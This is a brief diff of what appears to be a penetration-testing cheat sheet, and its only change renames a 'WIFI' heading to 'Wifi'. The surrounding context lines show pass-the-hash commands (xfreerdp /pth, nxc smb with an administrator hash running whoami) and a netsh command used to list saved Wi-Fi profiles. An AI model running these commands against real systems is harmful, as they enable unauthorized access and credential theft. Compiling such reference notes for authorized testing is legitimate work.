@@ -297,7 +297,7 @@ xfreerdp /v:10.10.10.10 /u:mon.user /pth:1234567894561zeyreye /cert:ignore
 nxc smb 10.10.10.10 --local-auth -u administrator -H 13213212121211212dfhgshsghgfd -x whoami 
 ```
 
-WIFI
+Wifi
 ---
 ```
 netsh wlan show profile
